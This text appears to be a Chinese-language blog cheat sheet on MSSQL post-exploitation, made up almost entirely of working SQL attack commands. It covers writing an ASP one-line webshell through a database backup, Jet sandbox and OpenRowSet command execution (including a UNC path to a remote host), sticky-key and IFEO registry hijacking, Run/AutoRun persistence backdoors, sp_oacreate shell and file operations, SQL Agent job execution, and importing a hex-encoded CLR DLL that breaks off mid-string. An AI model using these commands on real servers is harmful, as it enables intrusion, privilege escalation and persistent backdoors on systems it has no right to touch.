<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 生成备份文件,注意库名和路径</span></span><br><span class="line">backup database 库名 <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;c:\bak.bak&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [dbo].[test] ([cmd] [image]);</span><br><span class="line"><span class="comment">-- 插入一句话：&lt;%execute(request(&quot;a&quot;))%&gt;</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test(cmd) <span class="keyword">values</span>(<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>)</span><br><span class="line"><span class="comment">-- 再次备份,注意路径</span></span><br><span class="line">backup database 库名 <span class="keyword">to</span> disk<span class="operator">=</span><span class="string">&#x27;C:\d.asp&#x27;</span> <span class="keyword">WITH</span> DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure>



<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h2><ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>sqlserver服务权限为system</p>
</li>
<li><p>服务器拥有jet.oledb.4.0驱动</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_regwrite <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="string">&#x27;SandBoxMode&#x27;</span>,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> master.dbo.xp_regread <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>, <span class="string">&#x27;SandBoxMode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> OpenRowSet(<span class="string">&#x27;Microsoft.Jet.OLEDB.4.0&#x27;</span>,<span class="string">&#x27;;Databasec:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="string">&#x27;select shell( whoami )&#x27;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-- 修改注册表，关闭沙盒模式</span><br><span class="line">EXEC master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SoftWare\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0</span><br><span class="line"></span><br><span class="line">-- 开启 Ad Hoc Distributed Queries</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;ad hoc distributed queries&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">-- Until SQL Server 2012</span><br><span class="line"></span><br><span class="line">EXEC sp_MSset_oledb_prop N&#x27;Microsoft.ACE.OLEDB.12.0&#x27;, N&#x27;AllowInProcess&#x27;, 1</span><br><span class="line">EXEC master.dbo.sp_MSset_oledb_prop N&#x27;Microsoft.Jet.OLEDB.4.0&#x27;, N&#x27;AllowInProcess&#x27;, 1</span><br><span class="line"></span><br><span class="line">-- SQL Server 2014 or later</span><br><span class="line">EXEC sp_MSset_oledb_prop N&#x27;Microsoft.ACE.OLEDB.12.0&#x27;, N&#x27;DynamicParameters&#x27;, 1</span><br><span class="line">EXEC master.dbo.sp_MSset_oledb_prop N&#x27;Microsoft.Jet.OLEDB.4.0&#x27;, N&#x27;DynamicParameters&#x27;, 1</span><br><span class="line"></span><br><span class="line">-- Windows 2003 系统 c:\windows\system32\ias\ 目录下默认自带了 2 个 Access 数据库文件 ias.mdb/dnary.mdb, 所以直接调用即可.</span><br><span class="line">-- Windows 2008 R2 默认无 Access 数据库文件, 需要自己上传, 或者用 UNC 路径加载文件方能执行命令.</span><br><span class="line">-- SQL Server2008 默认未注册 microsoft.jet.oledb.4.0 接口, 所以无法利用沙盒模式执行系统命令.</span><br><span class="line"></span><br><span class="line">Select * From OpenRowSet(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;Database=c:\windows\system32\ias\ias.mdb&#x27;,</span><br><span class="line">&#x27;select shell(&quot;whoami&quot;)&#x27;);</span><br><span class="line"></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=\\192.168.1.8\file\ias.mdb&#x27;,&#x27;select shell(&quot;c:\windows\system32\cmd.exe /c net user &gt;c:\test.txt &quot;)&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h2><p>利用条件</p>
<ul>
<li>xpstar.dll</li>
</ul>
<h3 id="修改注册表来劫持粘贴键-映像劫持"><a href="#修改注册表来劫持粘贴键-映像劫持" class="headerlink" title="修改注册表来劫持粘贴键(映像劫持)"></a>修改注册表来劫持粘贴键(映像劫持)</h3><p>利用regwrite函数修改注册表，起到劫持作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite @rootkey=&#x27;HKEY_LOCAL_MACHINE&#x27;,@key=&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;,@value_name=&#x27;Debugger&#x27;,@type=&#x27;REG_SZ&#x27;,@value=&#x27;c:\windows\system32\cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">-- 检查是否劫持成功</span><br><span class="line">exec master..xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;Debugger&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="将-COM-对象注册到-CLSID"><a href="#将-COM-对象注册到-CLSID" class="headerlink" title="将 COM 对象注册到 CLSID"></a>将 COM 对象注册到 CLSID</h3><p>在进行 sp_oacreate 利用的时候就有使用 com 组件执行命令的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- 使用其 CLSID &#x27;0D43FE01-F093-11CF-8940-00A0C9054228&#x27; 注册 &#x27;The File System Object component&#x27;</span><br><span class="line">EXEC xp_regwrite N&#x27;HKEY_ CLASSES_ROOT&#x27;,</span><br><span class="line">N&#x27;CLSID\&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;\&#x27;, N&#x27;&#x27;, REG_SZ, N&#x27;FileSystem Object&#x27;;</span><br><span class="line">EXEC xp_regwrite N&#x27;HKEY_CLASSES_ROOT&#x27;,</span><br><span class="line">N&#x27;CLSID\(0D43FE01-F093-11CF-8940-00A0C9054228&#125;\InProcServer32&#x27;, N&#x27;&#x27;,</span><br><span class="line">REG_SZ, N&#x27;%systemroot%\system32\scrrun.dll&#x27;;</span><br><span class="line">EXEC xp_regwrite N&#x27;HKEY_CLASSES_ROOT&#x27;,</span><br><span class="line">N&#x27;CLSID\&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;\ProgID&#x27;,N&#x27;&#x27;,REG_SZ,</span><br><span class="line">N&#x27;Scripting.FileSystemObject&#x27;;</span><br><span class="line">EXEC xp_regwrite N&#x27;HKEY_CLASSES_ROOT&#x27;,</span><br><span class="line">N&#x27;CLSID\&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;\TypeLib&#x27;,N&#x27;&#x27;,REG_SZ,</span><br><span class="line">N&#x27;&#123;420B2830-E718-11CF-893D-00A0C9054228&#125;&#x27;;</span><br><span class="line">EXEC xp_regwrite N&#x27;HKEY_CLASSES_ROOT&#x27;,</span><br><span class="line">N&#x27;CLSID\&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;\Version&#x27;,N&#x27;&#x27;,REG_SZ,</span><br><span class="line">N&#x27;1.0&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="CMD-AutoRun"><a href="#CMD-AutoRun" class="headerlink" title="CMD AutoRun"></a>CMD AutoRun</h3><p>当 CMD.exe（命令处理器）启动时，如果未指定 &#x2F;D 标志，将执行 AutoRun 命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 将 CMD.exe 的 AutoRun 注册表项与软件可执行路径 (c:\windows\system32\calc.exe) 添加,作为持久化的后门</span><br><span class="line">EXEC master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Command Processor&#x27;,&#x27;Autorun&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\calc.exe&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="Run-RunOnce"><a href="#Run-RunOnce" class="headerlink" title="Run &amp; RunOnce"></a>Run &amp; RunOnce</h3><p>Run 和 RunOnce 注册表项会导致程序在用户每次登录时运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 通过将带有可执行路径 (c:\windows\system32\calc.exe) 的 Aut3 条目添加到此注册表路径，攻击者确保每次用户登录服务器时都会执行恶意软件。</span><br><span class="line">EXEC master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#x27;,&#x27;Aut3&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\calc.exe&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="禁用指定软件"><a href="#禁用指定软件" class="headerlink" title="禁用指定软件"></a>禁用指定软件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置在打开指定应用时，自动关闭.镜像劫持的方式。</span><br><span class="line"></span><br><span class="line">-- 禁用正在运行的进程的方法是使用 IFEO（Image File Execution Options），通过添加值为 taskkill 的调试器键，在这种情况下将杀死特定进程 Everything.exe：</span><br><span class="line">EXEC master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Everything.exe&#x27;,&#x27;Debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;taskkill.exe&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="Ole-automation-procedures提权"><a href="#Ole-automation-procedures提权" class="headerlink" title="Ole automation procedures提权"></a>Ole automation procedures提权</h3><ul>
<li>拥有DBA权限</li>
</ul>
<p>判断当前是否为DBA权限，为1则可以提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br></pre></td></tr></table></figure>



<p>判断SP_OACREATE状态,如果存在返回1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>



<p>开启Ole automation procedures</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#x27;show advanced options&#x27;, 0;</span><br></pre></td></tr></table></figure>



<p>命令执行多种方式</p>
<ul>
<li>wscript.shell组件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;,@ffffffff0x output</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;exec&#x27;,@exec output,&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="line">exec sp_oamethod @exec, &#x27;StdOut&#x27;, @text out</span><br><span class="line">exec sp_oamethod @text, &#x27;readall&#x27;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>



<p>wscript.shell组件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;,@ffffffff0x output</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\www\\1.txt&#x27;</span><br></pre></td></tr></table></figure>



<ul>
<li>com组件执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#x27;&#123;72C24DD5-D70A-438B-8A42-98424B88AFB8&#125;&#x27;,@ffffffff0x output</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;exec&#x27;,@exec output,&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="line">exec sp_oamethod @exec, &#x27;StdOut&#x27;, @text out</span><br><span class="line">exec sp_oamethod @text, &#x27;readall&#x27;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>



<ul>
<li>com 组件写文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @ObjectToken INT;</span><br><span class="line">EXEC Sp_OACreate &#x27;&#123;00000566-0000-0010-8000-00AA006D2EA4&#125;&#x27;,@ObjectToken OUTPUT;</span><br><span class="line">EXEC Sp_OASetProperty @ObjectToken, &#x27;Type&#x27;, 1;</span><br><span class="line">EXEC sp_oamethod @ObjectToken, &#x27;Open&#x27;;</span><br><span class="line">EXEC sp_oamethod @ObjectToken, &#x27;Write&#x27;, NULL, 0x66666666666666663078;</span><br><span class="line">EXEC sp_oamethod @ObjectToken, &#x27;SaveToFile&#x27;, NULL,&#x27;ffffffff0x.txt&#x27;,2;</span><br><span class="line">EXEC sp_oamethod @ObjectToken, &#x27;Close&#x27;;</span><br><span class="line">EXEC sp_OADestroy @ObjectToken;</span><br></pre></td></tr></table></figure>



<ul>
<li>filesystemobject COM 对象利用</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object">https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object</a><br>filesystemobject”COM 对象允许我们复制文件、管理驱动器等等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 利用 filesystemobject 写vbs脚本</span><br><span class="line">declare @o int, @f int, @t int, @ret int,@a int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o,&#x27;createtextfile&#x27;, @f out, &#x27;c:\\www\\ffffffff0x.vbs&#x27;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL, &#x27;hahahahahahhahahah&#x27;</span><br><span class="line"></span><br><span class="line">-- 配合 wscript.shell 组件执行</span><br><span class="line">DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out</span><br><span class="line">EXEC sp_oamethod @s,[run],NULL,[c:\\www\\ffffffff0x.vbs]</span><br></pre></td></tr></table></figure>



<p>复制具有不同名称和位置的 calc.exe 可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @ffffffff0x out;</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\system32\calc.exe&#x27;,&#x27;c:\\windows\\system32\calc_copy.exe&#x27;;</span><br></pre></td></tr></table></figure>



<p>移动文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;,@ffffffff0x out</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;movefile&#x27;,null,&#x27;c:\\www\\1.txt&#x27;,&#x27;c:\\www\\3.txt&#x27;</span><br></pre></td></tr></table></figure>



<p>删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @result int</span><br><span class="line">declare @ffffffff0x int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @ffffffff0x out</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;deletefile&#x27;,null,&#x27;c:\\www\\1.txt&#x27;</span><br><span class="line">exec sp_oadestroy @ffffffff0x</span><br></pre></td></tr></table></figure>



<p>替换粘滞键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">declare @ffffffff0x int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @ffffffff0x out;</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\system32\calc.exe&#x27;,&#x27;c:\\windows\\system32\sethc.exe&#x27;;</span><br><span class="line"></span><br><span class="line">declare @ffffffff0x int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @ffffffff0x out;</span><br><span class="line">exec sp_oamethod @ffffffff0x,&#x27;copyfile&#x27;,null,&#x27;c:\windows\system32\sethc.exe&#x27;,&#x27;c:\windows\system32\dllcache\sethc.exe&#x27;</span><br></pre></td></tr></table></figure>



<p>WMI COM 对象利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">declare @objWmi int,@objLocator int,@objPermiss int,@objRet int,@objFull varchar(8000)</span><br><span class="line">EXEC sp_OACreate &#x27;WbemScripting.SWbemLocator.1&#x27;,@objLocator OUTPUT;</span><br><span class="line">EXEC sp_OAMethod @objLocator,&#x27;ConnectServer&#x27;,@objWmi OUTPUT,&#x27;.&#x27;,&#x27;root\cimv2&#x27;;</span><br><span class="line">EXEC sp_OAMethod @objWmi,&#x27;Get&#x27;,@objPermiss OUTPUT,&#x27;Win32_LogicalFileSecuritySetting.Path=&#x27;&#x27;wscript.exe&#x27;&#x27;&#x27;;</span><br><span class="line">EXEC sp_OAMethod @objWmi,&#x27;Get&#x27;,@objFull OUTPUT, &#x27;Win32_SecurityDescriptor&#x27;;</span><br><span class="line">EXEC sp_OASetProperty @objFull,&#x27;ControlFlags&#x27;,4;</span><br><span class="line">EXEC sp_OAMethod @objPermiss,&#x27;SetSecurityDescriptor&#x27;,@objRet output,@objFull;</span><br></pre></td></tr></table></figure>

<h3 id="JobAgent提权"><a href="#JobAgent提权" class="headerlink" title="JobAgent提权"></a>JobAgent提权</h3><ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>需要sqlserver代理(sqlagent)开启</p>
</li>
</ul>
<hr>
<ol>
<li>尝试开启sqlagent</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#x27;start&#x27;,&#x27;SQLSERVERAGENT&#x27;;</span><br></pre></td></tr></table></figure>



<ol>
<li>利用任务计划命令执行（无回显）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 利用任务计划命令执行（无回显,可以 dnslog）</span><br><span class="line">-- 创建任务 test，这里test为任务名称，并执行命令，命令执行后的结果，将返回给文本文档out.txt</span><br><span class="line"></span><br><span class="line">use msdb;</span><br><span class="line">exec sp_delete_job null,&#x27;test&#x27;</span><br><span class="line">exec sp_add_job &#x27;test&#x27;</span><br><span class="line">exec sp_add_jobstep null,&#x27;test&#x27;,null,&#x27;1&#x27;,&#x27;cmdexec&#x27;,&#x27;cmd /c &quot;whoami&gt;c:/out.txt&quot;&#x27;</span><br><span class="line">exec sp_add_jobserver null,&#x27;test&#x27;,@@servername</span><br><span class="line">exec sp_start_job &#x27;test&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="CLR提权"><a href="#CLR提权" class="headerlink" title="CLR提权"></a>CLR提权</h3><p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地</p>
<ul>
<li>MDUT 中的16进制的dll</li>
</ul>
<p>dll的制作可以参考下面的文章</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10955#toc-12">https://xz.aliyun.com/t/10955#toc-12</a> </p>
</li>
<li><p>拥有DBA权限</p>
</li>
</ul>
<p>– 启用CLR,SQL Server 2017版本之前</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE; -- 显示高级选项</span><br><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE; -- 启用CLR</span><br><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON; -- 将存储.Net程序集的数据库配置为可信赖的</span><br></pre></td></tr></table></figure>



<p>– 启用CLR，SQL Server 2017版本及之后,引入了严格的安全性，可以选择根据提供的 SHA512 散列专门授予单个程序集的 UNSAFE 权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE;</span><br><span class="line">sp_add_trusted_assembly @hash= &lt;SHA512 of DLL&gt;; -- 将某程序集的SHA512哈希值添加到可信程序集列表中</span><br></pre></td></tr></table></figure>



<p>– 配置 EXTERNAL ACCESS ASSEMBLY 权限, test 是我指定的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_changedbowner &#x27;sa&#x27;</span><br><span class="line">ALTER DATABASE [test] SET trustworthy ON</span><br></pre></td></tr></table></figure>



<p>– 导入CLR插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [mssql_CLR]</span><br><span class="line">  AUTHORIZATION [dbo]</span><br><span class="line">  FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300660705620000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402360006002102360006002700E401000000002D00000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000004000000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F006D7373716C5F434C520053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C65